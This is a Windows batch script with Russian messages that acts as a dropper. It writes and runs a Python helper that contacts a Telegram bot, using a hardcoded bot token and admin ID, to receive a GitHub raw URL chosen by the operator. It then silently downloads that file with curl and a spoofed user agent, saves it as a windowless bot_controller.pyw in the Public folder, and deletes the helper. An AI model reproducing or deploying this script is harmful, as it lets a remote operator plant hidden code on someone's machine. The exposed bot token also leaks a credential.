@echo off
chcp 65001 > nul
setlocal EnableDelayedExpansion

if not exist "C:\Users\Public\BOT" mkdir "C:\Users\Public\BOT"

(
echo import asyncio
echo from aiogram import Bot
echo.
echo ADMIN_ID = 2037728749
echo BOT_TOKEN = "7695442117:AAECUnvLnzi-dFakkBCmrPJAeM8o_FtHdQM"
echo.
echo async def get_github_link^(^):
echo     bot = Bot^(token=BOT_TOKEN^)
echo     await bot.send_message^(ADMIN_ID, "Отправьте ссылку на RAW файл с GitHub"^)
echo     try:
echo         for _ in range^(600^):
echo             updates = await bot.get_updates^(offset=-1, limit=1, timeout=1^)
echo             if updates and updates[-1].message and updates[-1].message.from_user.id == ADMIN_ID:
echo                 link = updates[-1].message.text
echo                 if "raw.githubusercontent.com" in link:
echo                     await bot.send_message^(ADMIN_ID, "✅  Ссылка получена  ✅"^)
echo                     await bot.session.close^(^)
echo                     return link
echo             await asyncio.sleep^(1^)
echo         await bot.send_message^(ADMIN_ID, "❌  Время ожидания истекло  ❌"^)
echo     except Exception as e:
echo         await bot.send_message^(ADMIN_ID, f"❌  Ошибка: {e}"^)
echo     await bot.session.close^(^)
echo     return None
echo.
echo if __name__ == "__main__":
echo     link = asyncio.run^(get_github_link^(^)^)
echo     if link:
echo         with open^("github_link.txt", "w"^) as f:
echo             f.write^(link^)
) > get_link.py

echo Ожидание ссылки от Telegram бота...
python get_link.py

if exist github_link.txt (
    set /p DOWNLOAD_URL=<github_link.txt
    del github_link.txt
    
    echo Попытка скачивания файла...
    
    curl --silent --show-error --fail -L ^
         -H "User-Agent: Mozilla/5.0" ^
         -o "C:\Users\Public\BOT\bot_controller.pyw" ^
         "%DOWNLOAD_URL%"
    
    if %ERRORLEVEL% EQU 0 (
        echo ✅ Файл успешно скачан в C:\Users\Public\BOT
    ) else (
        echo ❌ Ошибка при скачивании файла
        echo Код ошибки: %ERRORLEVEL%
    )
) else (
    echo ❌ Не удалось получить ссылку от Telegram бота
)

del get_link.py
pause